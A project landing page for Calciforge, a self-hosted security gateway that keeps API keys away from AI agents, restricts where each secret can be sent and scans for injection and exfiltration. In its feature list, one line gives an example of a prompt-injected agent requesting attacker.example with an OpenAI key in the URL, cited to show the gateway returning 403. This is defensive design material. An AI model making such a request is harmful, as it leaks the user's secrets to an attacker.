---
layout: default
---

<style>
:root {
  --calci-fire: #d97706;
  --calci-fire-bright: #f59e0b;
  --calci-stone: #44403c;
  --calci-paper: #fafaf9;
  --calci-ink: #1c1917;
}
body { background: var(--calci-paper); color: var(--calci-ink); font-family: system-ui, -apple-system, sans-serif; line-height: 1.55; }
h1, h2, h3 { color: var(--calci-stone); }
h1 { font-size: 2.4rem; margin-bottom: 0.2rem; }
.tagline { color: var(--calci-fire); font-style: italic; font-size: 1.15rem; margin: 0 0 1.5rem; }
.hero-icons { display: flex; gap: 1.5rem; align-items: center; margin: 0 0 2rem; flex-wrap: wrap; }
.hero-icon { display: flex; flex-direction: column; align-items: center; min-width: 80px; }
.hero-icon svg { color: var(--calci-stone); }
.hero-icon span { font-size: 0.8rem; color: var(--calci-stone); margin-top: 0.3rem; }
.fire { color: var(--calci-fire); }
a { color: var(--calci-fire); text-decoration: none; border-bottom: 1px solid transparent; }
a:hover { border-bottom-color: var(--calci-fire); }
.nav { margin: 1.5rem 0; padding: 0.7rem 0; border-top: 1px solid #e7e5e4; border-bottom: 1px solid #e7e5e4; }
.nav a { margin-right: 1.5rem; font-weight: 500; }
ul li { margin-bottom: 0.4rem; }
code { background: #f5f5f4; padding: 0.1rem 0.35rem; border-radius: 3px; font-size: 0.92em; }
pre code { background: transparent; padding: 0; }
pre { background: #1c1917; color: #fafaf9; padding: 1rem; border-radius: 6px; overflow-x: auto; }
small { color: var(--calci-stone); }
</style>

<div class="hero-icons" aria-hidden="true">
  <div class="hero-icon">
    <!-- Castle silhouette -->
    <svg width="64" height="48" viewBox="0 0 64 48" fill="none">
      <path d="M4 44 L4 24 L8 24 L8 18 L14 18 L14 24 L20 24 L20 12 L26 12 L26 6 L32 0 L38 6 L38 12 L44 12 L44 24 L50 24 L50 18 L56 18 L56 24 L60 24 L60 44 Z" fill="currentColor"/>
      <rect x="28" y="28" width="8" height="16" fill="var(--calci-paper)"/>
      <circle cx="32" cy="32" r="1.5" fill="currentColor"/>
    </svg>
    <span>Castle</span>
  </div>
  <div class="hero-icon">
    <!-- Door with keyhole -->
    <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
      <rect x="10" y="4" width="28" height="44" rx="2" fill="currentColor"/>
      <rect x="14" y="8" width="20" height="36" rx="1" fill="var(--calci-paper)"/>
      <circle cx="24" cy="22" r="2.5" fill="currentColor"/>
      <rect x="22.8" y="22" width="2.4" height="6" fill="currentColor"/>
    </svg>
    <span>Doors</span>
  </div>
  <div class="hero-icon">
    <!-- Flame (Calcifer) -->
    <svg width="40" height="48" viewBox="0 0 40 48" fill="none" class="fire">
      <path d="M20 4 C16 12 8 16 8 28 C8 38 14 44 20 44 C26 44 32 38 32 28 C32 22 28 18 26 14 C24 18 22 18 22 14 C22 10 22 6 20 4 Z" fill="currentColor"/>
      <path d="M20 22 C18 26 14 28 14 34 C14 38 16 42 20 42 C24 42 26 38 26 34 C26 30 24 28 22 24 C21 26 20 26 20 22 Z" fill="var(--calci-fire-bright)"/>
    </svg>
    <span>Calcifer</span>
  </div>
</div>

# Calciforge

<p class="tagline">Keep your castle secure and moving.</p>

A self-hosted security gateway for AI agents. Every agent gets its own
bound contract — its own secrets, its own allowed destinations, its own
audit trail — without sharing API keys with anyone or trusting the
agent's own restraint.

<div class="nav">
<a href="https://github.com/bglusman/calciforge/blob/main/README.md">README</a>
<a href="https://github.com/bglusman/calciforge">GitHub</a>
<a href="https://github.com/bglusman/calciforge/blob/main/docs/architecture-review-2026-04-25.md">Architecture</a>
<a href="https://github.com/bglusman/calciforge/tree/main/docs/roadmap">Roadmap</a>
</div>

## What it does

- **Holds the API key, not the agent.** Substitutes `{{secret:NAME}}` at the gateway boundary so the agent never sees the real value.
- **Per-secret destination allowlist.** A prompt-injected agent calling `https://attacker.example/?key={{secret:OPENAI_KEY}}` returns 403 before the resolver is consulted.
- **Multi-channel chat in.** `!secure` commands on Telegram, Matrix, WhatsApp; localhost paste UI for one-shot or bulk `.env` input.
- **MCP server out.** Agents discover available secret *names* but never the values.
- **Inbound + outbound content scanning.** Adversary-detector flags injection payloads on the way in, secret-shaped exfil on the way out.
- **Starlark policy sidecar.** Per-tool decisions evaluated by `clashd`.
- **mTLS host-agent.** Sensitive system ops (ZFS, systemd, PCT, git, exec) gated behind a separate authenticated daemon.

## The vocabulary

A working metaphor borrowed from a famously well-designed magical
contract:

- **Calciforge** — the project / CLI / shipped tool. The forge.
- **Calcifer** — a single agent's bound contract. Its specific deal with the door magic.
- **Moving Castle** — a deployment hosting a household of Calcifers.
- **Doors** — the thresholds the Calcifer guards.
- **Doors to other Castles** — federation between Calciforge instances. ([roadmap](https://github.com/bglusman/calciforge/blob/main/docs/roadmap/team-chatops-slack-discord.md))

## Status

Solo-operator mature, multi-user team mode in progress. Mac-tested,
Linux-ready (CI runs Ubuntu, daily-use is macOS + a Proxmox CT for
headless deployment).

## Install

```bash
git clone https://github.com/bglusman/calciforge
cd calciforge
brew install fnox && fnox init
bash scripts/install.sh
```

See the [README](https://github.com/bglusman/calciforge/blob/main/README.md) for the full picture.

---

<small>
MIT-licensed. Some bundled tools carry their own licenses.
The vocabulary is inspired by Diana Wynne Jones's <em>Howl's Moving Castle</em> as a metaphor for the system's
per-agent contracts and reconfigurable doors — no characters, art, or text from the book or its film
adaptation are used or referenced beyond name inspiration.
</small>
